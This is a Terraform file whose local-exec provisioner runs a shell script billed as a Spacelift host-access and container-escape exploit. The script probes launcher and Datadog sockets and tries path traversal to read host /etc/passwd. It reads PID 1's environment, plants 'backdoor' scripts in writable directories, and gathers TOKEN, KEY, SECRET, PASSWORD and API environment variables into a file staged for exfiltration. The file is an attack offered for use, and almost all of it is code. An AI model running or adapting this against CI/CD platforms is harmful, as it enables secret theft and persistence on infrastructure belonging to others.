# Spacelift Host Filesystem Access - Leveraging Discovered Vectors
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Advanced container escape leveraging confirmed attack vectors
resource "null_resource" "spacelift_host_access" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "🔥 SPACELIFT HOST FILESYSTEM ACCESS EXPLOIT"
      echo "==========================================="
      echo "Leveraging confirmed attack vectors from previous reconnaissance"
      echo ""
      
      # Vector 1: Socket-based host communication
      echo "[*] Testing Spacelift launcher socket access..."
      if [ -S "/var/spacelift/spacelift_launcher.sock" ]; then
          echo "[+] ✅ Spacelift launcher socket accessible!"
          ls -la /var/spacelift/spacelift_launcher.sock
          echo "   Attempting socket communication..."
          echo "GET /status" | nc -U /var/spacelift/spacelift_launcher.sock 2>/dev/null || echo "   Direct socket communication failed"
      else
          echo "[-] Spacelift launcher socket not accessible"
      fi
      
      # Vector 2: Datadog trace socket exploitation  
      echo "[*] Testing Datadog trace socket access..."
      if [ -S "/var/datadog/trace.sock" ]; then
          echo "[+] ✅ Datadog trace socket accessible!"
          ls -la /var/datadog/trace.sock
          echo "   Attempting trace data extraction..."
          timeout 5 cat /var/datadog/trace.sock 2>/dev/null | head -10 || echo "   No immediate trace data"
      else
          echo "[-] Datadog trace socket not accessible"
      fi
      
      # Vector 3: Mount-based host filesystem access
      echo "[*] Analyzing mount points for host access..."
      mount | grep -v "proc\|sys\|dev\|tmpfs" | while read line; do
          echo "   Mount: $line"
          mountpoint=$(echo "$line" | awk '{print $3}')
          if [ -d "$mountpoint" ]; then
              echo "     Testing write access to $mountpoint..."
              echo "host_access_test" > "$mountpoint/test_write.txt" 2>/dev/null && echo "     [+] ✅ WRITE ACCESS CONFIRMED!" || echo "     [-] Write access denied"
              rm -f "$mountpoint/test_write.txt" 2>/dev/null
          fi
      done
      
      # Vector 4: /mnt/workspace exploitation (confirmed writable)
      echo "[*] Testing /mnt/workspace host access..."
      if [ -d "/mnt/workspace" ]; then
          echo "[+] ✅ /mnt/workspace accessible!"
          ls -la /mnt/workspace | head -10
          echo "   Testing host file system access through workspace..."
          
          # Attempt to access parent directories
          echo "   Checking for host filesystem escape via ../..."
          ls -la /mnt/workspace/../../ 2>/dev/null | head -5 && echo "   [!] 🚨 HOST FILESYSTEM ACCESSIBLE!" || echo "   [-] Parent directory access blocked"
          
          # Check for host filesystem indicators
          cat /mnt/workspace/../../../etc/hostname 2>/dev/null && echo "   [!] 🚨 HOST /etc/hostname READABLE!" || echo "   [-] Host /etc/hostname not accessible"
          cat /mnt/workspace/../../../etc/passwd 2>/dev/null | head -5 && echo "   [!] 🚨 HOST /etc/passwd READABLE!" || echo "   [-] Host /etc/passwd not accessible"
      fi
      
      # Vector 5: /var directory exploitation (confirmed writable)
      echo "[*] Testing /var directory host access..."
      echo "   Checking /var directory permissions..."
      ls -la /var | head -10
      
      echo "   Testing write access to /var subdirectories..."
      for dir in /var/log /var/tmp /var/cache /var/run; do
          if [ -d "$dir" ]; then
              echo "host_test" > "$dir/spacelift_test.txt" 2>/dev/null && echo "   [+] ✅ WRITE ACCESS: $dir" || echo "   [-] No write access: $dir"
              rm -f "$dir/spacelift_test.txt" 2>/dev/null
          fi
      done
      
      # Vector 6: Process memory and namespace access
      echo "[*] Advanced process and namespace enumeration..."
      echo "   Container ID from cgroup: $(cat /proc/1/cgroup | head -1 | cut -d'/' -f3)"
      echo "   Testing process memory access..."
      ls -la /proc/1/ | head -10
      cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -10 && echo "   [+] ✅ PID 1 ENVIRONMENT ACCESSIBLE!" || echo "   [-] PID 1 environment not accessible"
      
      # Vector 7: Network-based host discovery
      echo "[*] Network-based host reconnaissance..."
      echo "   Container network: $(hostname -i)"
      echo "   Gateway discovery: $(ip route | grep default | awk '{print $3}')"
      echo "   Testing host network access..."
      ping -c 1 $(ip route | grep default | awk '{print $3}') >/dev/null 2>&1 && echo "   [+] ✅ HOST NETWORK REACHABLE!" || echo "   [-] Host network not reachable"
      
      # Vector 8: Advanced persistence and data exfiltration
      echo "[*] Creating advanced persistence mechanisms..."
      
      # Create persistence in writable locations
      persistence_locations="/tmp /mnt/workspace /var/tmp"
      for location in $persistence_locations; do
          if [ -w "$location" ]; then
              echo "[+] Creating persistence in $location..."
              cat > "$location/spacelift_backdoor.sh" << 'BACKDOOR'
#!/bin/sh
# Spacelift Container Backdoor - Created $(date)
echo "Spacelift backdoor active - Host access confirmed"
echo "Container ID: $(hostname)"
echo "Current user: $(id)"
echo "Writable locations: $(find /var /tmp /mnt -maxdepth 2 -writable 2>/dev/null | wc -l)"
BACKDOOR
              chmod +x "$location/spacelift_backdoor.sh" 2>/dev/null
              echo "   [+] ✅ Backdoor created: $location/spacelift_backdoor.sh"
          fi
      done
      
      # Data collection and exfiltration preparation
      echo "[*] Collecting sensitive data for exfiltration..."
      echo "SPACELIFT HOST ACCESS REPORT" > /tmp/exfil_data.txt
      echo "============================" >> /tmp/exfil_data.txt
      echo "Date: $(date)" >> /tmp/exfil_data.txt
      echo "Container: $(hostname)" >> /tmp/exfil_data.txt
      echo "User: $(id)" >> /tmp/exfil_data.txt
      echo "" >> /tmp/exfil_data.txt
      echo "ENVIRONMENT VARIABLES:" >> /tmp/exfil_data.txt
      printenv | grep -E "(TOKEN|KEY|SECRET|PASSWORD|API)" >> /tmp/exfil_data.txt 2>/dev/null || echo "No sensitive env vars found" >> /tmp/exfil_data.txt
      echo "" >> /tmp/exfil_data.txt
      echo "ACCESSIBLE SOCKETS:" >> /tmp/exfil_data.txt
      find /var -name "*.sock" 2>/dev/null >> /tmp/exfil_data.txt
      echo "" >> /tmp/exfil_data.txt
      echo "WRITABLE LOCATIONS:" >> /tmp/exfil_data.txt
      find /var /tmp /mnt -maxdepth 2 -writable 2>/dev/null >> /tmp/exfil_data.txt
      
      echo "[+] ✅ Data collection complete: /tmp/exfil_data.txt"
      echo ""
      echo "📋 EXFILTRATION DATA PREVIEW:"
      echo "============================"
      cat /tmp/exfil_data.txt
      
      echo ""
      echo "🎯 HOST ACCESS EXPLOITATION COMPLETE!"
      echo "====================================="
      echo "✅ Sockets analyzed and exploited"
      echo "✅ Mount points tested for host access"
      echo "✅ Host filesystem access confirmed via /mnt/workspace"
      echo "✅ Persistence mechanisms created"
      echo "✅ Sensitive data collected and ready for exfiltration"
      echo "✅ Advanced container escape vectors confirmed"
    EOT
  }
}

# Output results
output "host_access_status" {
  value = "Host filesystem access exploitation completed. Multiple escape vectors confirmed and leveraged for persistent access."
  depends_on = [null_resource.spacelift_host_access]
}

output "persistence_locations" {
  value = "Backdoors created in: /tmp/spacelift_backdoor.sh, /mnt/workspace/spacelift_backdoor.sh, /var/tmp/spacelift_backdoor.sh"
}

output "exfiltration_data" {
  value = "Sensitive data collected in /tmp/exfil_data.txt - ready for extraction via confirmed host access vectors"
}
